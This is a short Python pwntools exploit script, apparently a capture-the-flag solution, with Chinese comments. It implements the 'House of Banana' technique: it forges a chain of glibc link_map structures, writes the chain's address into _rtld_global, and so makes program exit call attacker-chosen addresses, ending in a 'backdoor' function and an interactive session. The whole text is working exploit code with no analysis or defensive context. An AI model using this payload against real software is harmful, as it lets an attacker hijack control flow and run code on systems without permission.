from pwn import *
from base_data import *

def HOB(call_addr, fake_link_map_addr, _ns_nloaded = 4):
    '''
        call_addr           : 要调用的函数列表,正序放入
        fake_link_map_addr  : 伪造的link_map的地址
        _ns_nloaded         : 值为_rtld_global._dl_ns[0]._ns_nloaded, 默认为4, gdb使用p _rtld_global._dl_ns[0]._ns_nloaded查看
    
        返回: 伪造的link_map结构体, 将其地址写入_rtld_global头即可, 可以通过p &_rtld_global来查看你要修改的地址
    
        注: ASLR保护
    '''
    payload = b''
    # 伪造link_map链表
    for i in range(_ns_nloaded):
        payload = payload.ljust(0x28 * i + 0x18, b'\x00') + p64(fake_link_map_addr + 0x28 * (i + 1))# l_next
        payload = payload.ljust(0x28 * i + 0x28, b'\x00') + p64(fake_link_map_addr + 0x28 * i)      # l_real
    payload = payload.ljust(0x110, b'\x00')
    # 调用函数列表指针
    payload += p64(fake_link_map_addr + 0x110) + p64(fake_link_map_addr + 0x130)
    # 调用函数的个数
    payload += p64(fake_link_map_addr + 0x120) + p64(8 * len(call_addr))
    # 调用函数列表
    for func in call_addr[::-1]:
        payload += p64(func)
    # 进入if
    payload = payload.ljust(0x318, b'\x00') + p64(0x800000000)
    return payload

if __name__ == "__main__":
    p = process('./pwn')
    heap_addr   = int(p.recv(14), 16)
    fun1        = int(p.recv(14), 16)
    fun2        = int(p.recv(14), 16)
    fun3        = int(p.recv(14), 16)
    backdoor    = int(p.recv(14), 16)
    p.send(HOB([fun1, fun2, fun3, backdoor], heap_addr))
    p.interactive()
    